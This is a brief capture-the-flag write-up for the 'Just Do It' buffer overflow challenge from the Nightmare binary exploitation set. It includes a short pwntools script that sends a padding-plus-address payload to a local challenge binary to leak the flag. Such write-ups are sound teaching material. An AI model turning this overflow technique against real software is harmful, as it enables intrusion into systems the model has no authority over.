# TW17 Just Do It
Just do it, is a easy `Buffer Overflow` challenge which was part of the `Nightmare` Binary Exploitation set of challenges. It was pretty simple, like most of the challenges we have dealt with so far.

You basically just overwrite a memory address with the flag address and it will call to puts hence showing us our flag.
```py
from pwn import *

io = process("./just_do_it")
#PASSWORD = "P@SSW0RD"

PAYLOAD = b"A" * 20 + p32(0x0804a080)
io.sendline(PAYLOAD)
io.recvline()
io.recvline()
print(io.recvline()) # You can also use interactive instead of using
                     # multiple io.recvline()

```
